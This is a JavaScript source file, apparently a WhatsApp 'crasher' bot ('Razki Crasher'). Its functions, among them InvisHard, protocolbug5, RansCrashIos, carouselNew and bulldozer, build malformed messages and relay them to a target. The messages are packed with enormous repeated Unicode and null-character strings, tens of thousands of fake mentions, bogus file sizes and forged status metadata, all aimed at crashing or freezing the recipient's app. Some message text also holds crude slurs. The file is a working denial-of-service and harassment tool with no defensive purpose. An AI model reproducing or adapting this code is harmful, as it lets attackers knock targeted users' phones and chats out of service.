    await rikz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: mentionedList.map(jid => ({
                            tag: "to",
                            attrs: { jid },
                            content: undefined
                        }))
                    }
                ]
            }
        ]
    });

    if (mention) {
        await rikz.relayMessage(isTarget, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}
        
async function mentionSw(isTarget) {
    const delaymention = Array.from({
        length: 9741
    }, (_, r) => ({
        title: "᭯".repeat(9741),
        rows: [{
            title: r + 1,
            id: r + 1
        }]
    }));
    
    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "Razki Crasher 🐍〽",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: {
                        selectedRowId: "🌀"
                    },
                    contextInfo: {
                        mentionedJid: Array.from({
                            length: 9741
                        }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        participant: isTarget,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "0@newsletter",
                            serverMessageId: 1,
                            newsletterName: "CikssXyz? Come Heree!!!🐍〽"
                        }
                    },
                    description: "CikssXyx?? yess, sirrr!!!🐍〽"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(isTarget, MSG, {});

    await rikz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{
                    tag: "to",
                    attrs: {
                        jid: isTarget
                    },
                    content: undefined
                }]
            }]
        }]
    });
}
//InvisHard
async function InvisHard(target, mention) {
            let msg = await generateWAMessageFromContent(target, {
                buttonsMessage: {
                    text: "🩸",
                    contentText:
                        "INVISHARDER",
                    footerText: "InvisibleHard༑",
                    buttons: [
                        {
                            buttonId: ".bugs",
                            buttonText: {
                                displayText: "🇷🇺" + "\u0000".repeat(800000),
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});
        
            await rikz.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
            if (mention) {
                await rikz.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: { is_status_mention: "InvisHarder" },
                                content: undefined,
                            },
                        ],
                    }
                );
            }
        }
// Func Neww!!
async function protocolbug5(isTarget, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".Erlangga Come Heree!!" + "ោ៝".repeat(10000),
        title: "Finix",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "CikssXyz?✦ Im Begginner",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "༿༑ᜳ𝗥͢𝗬𝗨͜𝗜̸𝗖͠͠͠𝗛̭𝗜̬ᢶ⃟"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(isTarget, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await rikz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: isTarget }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await rikz.relayMessage(isTarget, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}
//FlowX
async function FlowX(isTarget) {
  let msg = await generateWAMessageFromContent(
    isTarget,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "",
              hasMediaAttachment: false,
            },
            body: {
              text: "⿻͠𝐀᪶͜͡𝐧ࣼ𝐨͜͡𝐧͠ 𝐘̶᪶᪳𝐦᪳𝐨᪶᪳ᷤ𝐮᪶᪳𝐬᪳᪳͢☇⿻",
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: venomModsData + "\u0000",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: venomModsData + "⿻͠𝐀᪶͜͡𝐧ࣼ𝐨͜͡𝐧͠ 𝐘̶᪶᪳𝐦᪳𝐨᪶᪳ᷤ𝐮᪶᪳𝐬᪳᪳͢☇⿻",
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await rikz.relayMessage(isTarget, msg.message, {
    messageId: msg.key.id,
    participant: { jid: isTarget },
  });
}

const Qcrl = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    interactiveMessage: {
      body: { 
        title: "rans", 
        text: "\u0000".repeat(77777),
        footer: "",
        description: ""
      },
      carouselMessage: {
        cards: []
      },
      contextInfo: {
        mentionedJid: ["status@broadcast"]
      }
    }
  }
};
//buttonnull
async function buttonnull(target) {
    const spamMessage = "@1_".repeat(10200);
    const crashMessage = "ꦽ".repeat(10200);
    await Ryc.relayMessage(
        target,
        {
            viewOnceMessage: {
                message: {
                    extendedTextMessage: {
                        text: "'Hy Bro" + spamMessage,
                        previewType: "Hola 🤣",
                        contextInfo: {
                            mentionedJid: [
                                target, 
                            ],
                        },
                    },
                },
            },
        },
        {
            participant: {
                jid: target,
            },
        }
    );
}
//NaviFlex
async function NaviFlex(target, mention) {
    const thumbnail = 'https://files.catbox.moe/uim3u1.jpeg'

    const { imageMessage } = await generateWAMessageContent({
        image: { url: thumbnail }
    }, {
        upload: Ryc.waUploadToServer
    });

    const repeatedText = 'ꦽ'.repeat(50000); 
    const bodyText = `𝐀᪶͜͡𝐧ࣼ𝐨͜͡𝐧͠ 𝐘̶᪶᪳𝐦᪳𝐨᪶᪳ᷤ𝐮᪶᪳𝐬᪳᪳͢☇${repeatedText}`;

    const cards = [
        {
            header: {
                imageMessage,
                hasMediaAttachment: true
            },
            body: { text: bodyText },
            nativeFlowMessage: {
                buttons: [{
                    name: "cta_url",
                    buttonParamsJson: JSON.stringify({
                        display_text: "Panik Dekk",
                        url: "https://wa.me/6283159682165",
                        merchant_url: "https://www.google.com"
                    })
                }]
            }
        },
        {
            header: {
                imageMessage,
                hasMediaAttachment: true
            },
            body: { text: bodyText },
            nativeFlowMessage: {
                buttons: [{
                    name: "cta_url",
                    buttonParamsJson: JSON.stringify({
                        display_text: "Panik Dekk",
                        url: "https://wa.me/6283159682165",
                        merchant_url: "https://www.google.com"
                    })
                }]
            }
        },
        {
            header: {
                imageMessage,
                hasMediaAttachment: true
            },
            body: { text: bodyText },
            nativeFlowMessage: {
                buttons: [{
                    name: "cta_url",
                    buttonParamsJson: JSON.stringify({
                        display_text: "Panik Dekk",
                        url: "https://wa.me/6283159682165",
                        merchant_url: "https://www.google.com"
                    })
                }]
            }
        },
        {
            header: {
                imageMessage,
                hasMediaAttachment: true
            },
            body: { text: bodyText },
            nativeFlowMessage: {
                buttons: [{
                    name: "cta_url",
                    buttonParamsJson: JSON.stringify({
                        display_text: "Panik Dekk",
                        url: "https://wa.me/6283159682165",
                        merchant_url: "https://www.google.com"
                    })
                }]
            }
        }, 
        {
            header: {
                imageMessage,
                hasMediaAttachment: true
            },
            body: { text: bodyText },
            nativeFlowMessage: {
                buttons: [{
                    name: "cta_url",
                    buttonParamsJson: JSON.stringify({
                        display_text: "Panik Dekk",
                        url: "https://wa.me/6283159682165",
                        merchant_url: "https://www.google.com"
                    })
                }]
            }
        }
    ];

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: { text: bodyText },
                    carouselMessage: {
                        cards,
                        messageVersion: 1
                    }
                }
            }
        }
    }, {});

    await rikz.relayMessage(msg.key.remoteJid, msg.message, {
        participant: { jid: target },
        messageId: msg.key.id,
    });
}
//ransHardUi
async function ransHardUi(target, Ptcp = false) {
    rikz.relayMessage(target, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "𝐀᪶͜͡𝐧ࣼ𝐨͜͡𝐧͠ 𝐘̶᪶᪳𝐦᪳𝐨᪶᪳ᷤ𝐮᪶᪳𝐬᪳᪳͢☇ DONT UI" + "ꦽ".repeat(92000) + "꧀".repeat(92000) + '@5'.repeat(92000)
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: "",
                            },
                            {
                                name: "call_permission_request",
                                buttonParamsJson: "",
                            },
                            {
                                name: "mpm",
                                buttonParamsJson: "",
                            },
                            {
                                name: "mpm",
                                buttonParamsJson: "",
                            },
                            {
                                name: "mpm",
                                buttonParamsJson: "",
                            },
                            {
                                name: "mpm",
                                buttonParamsJson: "",
                            },
                        ],
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "CoDe" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
//RansCrashIos
async function RansCrashIos(target) {
                   try {
                           const IphoneCrash = "𑇂𑆵𑆴𑆿".repeat(60000);
                           await rikz.relayMessage(target, {
                                   locationMessage: {
                                           degreesLatitude: 11.11,
                                           degreesLongitude: -11.11,
                                           name: "iOs Crash          " + IphoneCrash,
                                           url: "https://youtube.com/@yatim"
                                   }
                           }, {
                                   participant: {
                                           jid: target
                                   }
                           });
                           console.log("Send Bug By Razki Crasher invis ios");
                   } catch (error) {
                           console.error("Error Sending Bug:", error);
                   }
}
//RkBlankNotif
async function RkBlankNotif(target, Ptcp = false) {
    let virtex =
        "sukiii " +
        "ꦽ".repeat(92000) +
        "_*~@8~*_\n".repeat(92000);

    await rikz.relayMessage(
        target,
        {
            ephemeralMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                fileLength: "9999999999999",
                                pageCount: 1316134911,
                                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                                fileName: "©𝗩𝗮𝗺𝗽𝗶𝗿𝗲 𝗙𝗶𝗹𝗲",
                                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1726867151",
                                contactVcard: true,
                                jpegThumbnail: "https://files.catbox.moe/m33kq5.jpg",
                            },
                            hasMediaAttachment: true,
                        },
                        body: {
                            text: virtex,
                        },
                        nativeFlowMessage: {
                            name: "call_permission_request",
                            messageParamsJson: "\u0000",
                        },
                        contextInfo: {
                            mentionedJid: ["0@s.whatsapp.net"],
                            forwardingScore: 1,
                            isForwarded: true,
                            fromMe: false,
                            participant: "0@s.whatsapp.net",
                            remoteJid: "status@broadcast",
                            quotedMessage: {
                                documentMessage: {
                                    url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                    fileLength: "9999999999999",
                                    pageCount: 1316134911,
                                    mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                                    fileName: "Bokep ",
                                    fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                                    directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                    mediaKeyTimestamp: "1724474503",
                                    contactVcard: true,
                                    thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                                    thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                                    thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                                    jpegThumbnail: "https://files.catbox.moe/m33kq5.jpg",
                                },
                            },
                        },
                    },
                },
            },
        },
        Ptcp
            ? {
                  participant: {
                      jid: target,
                  },
              }
            : {}
    );

    console.log(chalk.green.bold("bug masuk harap jeda"));
}

async function carouselNew(isTarget) {
  for (let i = 0; i < 20; i++) {
    let push = [];
    let buttt = [];

    for (let i = 0; i < 20; i++) {
      buttt.push({
        "name": "galaxy_message",
        "buttonParamsJson": JSON.stringify({
          "header": "\u0000".repeat(10000),
          "body": "\u0000".repeat(10000),
          "flow_action": "navigate",
          "flow_action_payload": { screen: "FORM_SCREEN" },
          "flow_cta": "Grattler",
          "flow_id": "1169834181134583",
          "flow_message_version": "3",
          "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
        })
      });
    }

    for (let i = 0; i < 10; i++) {
      push.push({
        "body": {
          "text": "CikssXyz" + "ꦾ".repeat(11000)
        },
        "footer": {
          "text": "dont panic!!"
        },
        "header": { 
          "title": 'memekk' + "\u0000".repeat(50000),
          "hasMediaAttachment": true,
          "imageMessage": {
            "url": "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
            "mimetype": "image/jpeg",
            "fileSha256": "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
            "fileLength": "591",
            "height": 0,
            "width": 0,
            "mediaKey": "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
            "fileEncSha256": "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
            "directPath": "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
            "mediaKeyTimestamp": "1721344123",
            "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBIv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
            "scansSidecar": "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
            "scanLengths": [
              247,
              201,
              73,
              63
            ],
            "midQualityFileSha256": "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
          }
        },
        "nativeFlowMessage": {
          "buttons": []
        }
      });
    }

    const carousel = generateWAMessageFromContent(isTarget, {
      "viewOnceMessage": {
        "message": {
          "messageContextInfo": {
            "deviceListMetadata": {},
            "deviceListMetadataVersion": 2
          },
          "interactiveMessage": {
            "body": {
              "text": "Kontol " + "ꦾ".repeat(55000)
            },
            "footer": {
              "text": "( 🐉 ) Razki Crasher V2.0 ( 🐉 )"
            },
            "header": {
              "hasMediaAttachment": false
            },
            "carouselMessage": {
              "cards": [
                ...push
              ]
            }
          }
        }
      }
    }, {});

    await rikz.relayMessage(isTarget, carousel.message, {
      messageId: carousel.key.id
    });
    console.log("Razki Sending Carousel New !!");
  }
}
        
// Func Buldozer
async function bulldozer(isTarget) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(isTarget, message, {});

  await rikz.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: isTarget },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

// Func Delay Sticker
async function DelayStc(langgxyz, isTarget) {
  const stickerUrl = 'https://mmg.whatsapp.net/v/t62.15575-24/19150882_1067131252135670_7526121283421345296_n.enc?ccb=11-4&oh=01_Q5Aa1QGx2Xli_wH0m1PZibMLTsbEhEyXSzx7JhlUBTrueJgJfQ&oe=683D5DD3&_nc_sid=5e03e0&mms3=true';

  const mentionedJid = Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net");

  const stickerMsg = {
    key: {
      remoteJid: isTarget,
      fromMe: true,
      id: (new Date().getTime()).toString()
    },
    message: {
      stickerMessage: {
        url: stickerUrl,
        mimetype: 'image/webp',
        fileSha256: Buffer.from([
          187, 146, 22, 50, 195, 167, 208, 126,
          9, 85, 68, 142, 83, 49, 94, 118,
          1, 203, 45, 28, 56, 91, 122, 225,
          139, 174, 84, 97, 202, 226, 252, 163
        ]),
        fileEncSha256: Buffer.from([
          1, 254, 7, 45, 33, 43, 134, 167,
          251, 8, 52, 166, 190, 90, 18, 147,
          250, 143, 80, 250, 190, 46, 203, 103,
          130, 205, 132, 101, 235, 40, 60, 22
        ]),
        mediaKey: Buffer.from([
          234, 34, 50, 200, 155, 222, 255, 16,
          171, 221, 14, 53, 40, 212, 205, 246,
          163, 9, 7, 35, 191, 155, 107, 246,
          33, 191, 184, 168, 105, 109, 140, 184
        ]),
        fileLength: { low: 3304, high: 0, unsigned: true },
        directPath: '/v/t62.15575-24/19150882_1067131252135670_7526121283421345296_n.enc?ccb=11-4&oh=01_Q5Aa1QGx2Xli_wH0m1PZibMLTsbEhEyXSzx7JhlUBTrueJgJfQ&oe=683D5DD3&_nc_sid=5e03e0',
        mediaKeyTimestamp: { low: 1746262763, high: 0, unsigned: false },
        isAnimated: false,
        isAvatar: false,
        isAiSticker: false,
        isLottie: false,
        contextInfo: {
          mentionedJid
        }
      }
    }
  };

  await rikz.relayMessage(isTarget, stickerMsg.message, { messageId: stickerMsg.key.id });
}


// Send Pairing
async function SendPairing(isTarget, Ptcp = false) {
  const messageContent = {
    viewOnceMessage: {
      message: {
        nativeFlowResponseMessage: {
          status: true,
          criador: "VenomMods",
          resultado: JSON.stringify({
            type: "md",
            ws: {
              _events: {
                "CB:ib,,dirty": ["Array"]
              },
              _eventsCount: 20,
              _maxListeners: 0,
              url: "wss://web.whatsapp.com/ws/chat",
              config: {
                version: ["Array"],
                browser: ["Array"],
                waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                connectTimeoutMs: 20000,
                keepAliveIntervalMs: 30000,
                logger: {},
                printQRInTerminal: false,
                emitOwnEvents: true,
                defaultQueryTimeoutMs: 60000,
                customUploadHosts: [],
                retryRequestDelayMs: 250,
                maxMsgRetryCount: 5,
                fireInitQueries: true,
                auth: "authData",
                markOnlineOnConnect: true,
                syncFullHistory: false,
                linkPreviewImageThumbnailWidth: 192,
                transactionOpts: "transactionOptsData",
                generateHighQualityLinkPreview: false,
                options: {},
                appStateMacVerification: "appStateMacData",
                mobile: false
              }
            }
          }, null, 2) // JSON stringified for pretty format
        }
      }
    }
  };

  try {
    await rikz.relayMessage(isTarget, messageContent, Ptcp ? {
      participant: {
        jid: isTarget
      }
    } : {});
    console.log("Success Send Pairing to Target");
  } catch (error) {
    console.error("Failed to send Pairing to Target:", error);
  }
}


async function SockMentionJid3(target, Ptcp = false) {
      await rikz.relayMessage(
        target,
        {
          extendedTextMessage: {
            text: "༑⃟𝗜༑⃟Kntija☇peler༑bnz༑⃐⃐⃐ㇱ-" + "@0".repeat(90000),
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 15000,
                  },
                  () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                ),
              ],
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [
                    {
                      jid: "0@s.whatsapp.net",
                      callOutcome: "1",
                    },
                  ],
                },
              },
              remoteJid: target,
              conversionSource: " target ",
              conversionData: "",
              conversionDelaySeconds: 10,
              forwardingScore: 9999999,
              isForwarded: true,
              quotedAd: {
                advertiserName: " target ",
                mediaType: "IMAGE",
                jpegThumbnail:
                  "https://telegra.ph/file/aba43b3fdd3003a4a8539.jpg",
                caption: " target ",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              expiration: 86400,
              ephemeralSettingTimestamp: "1728090592378",
              ephemeralSharedSecret:
                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
              externalAdReply: {
                title: "\u0000",
                body: "\u0000",
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewType: "VIDEO",
                thumbnail: "https://telegra.ph/file/aba43b3fdd3003a4a8539.jpg",
                sourceType: " target ",
                sourceId: " target ",
                sourceUrl: "https://www.facebook.com/WhatsApp",
                mediaUrl: "https://www.facebook.com/WhatsApp",
                containsAutoReply: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              entryPointConversionSource: "entry_point_source_example",
              entryPointConversionApp: "entry_point_app_example",
              entryPointConversionDelaySeconds: 5,
              disappearingMode: {},
              actionLink: {
                url: "https://www.facebook.com/WhatsApp",
              },
              groupSubject: " target ",
              parentGroupJid: "120363321780343299-0@g.us",
              trustBannerType: " target ",
              trustBannerAction: 1,
              isSampled: true,
              utm: {
                utmSource: " target ",
                utmCampaign: " target ",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363321780343299-0@g.us",
                serverMessageId: 1,
                newsletterName: " target ",
                contentType: "UPDATE",
                accessibilityText: " target ",
              },
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
              smbClientCampaignId: "smb_client_campaign_id_example",
              smbServerCampaignId: "smb_server_campaign_id_example",
              dataSharingContext: {
                showMmDisclosure: true,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }
    
    
 async function BaccaratUi(langgxyz, target) {
  await rikz.relayMessage(
    target,
    {
      groupMentionedMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                mimetype:
                  "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                fileLength: "9999999999999999",
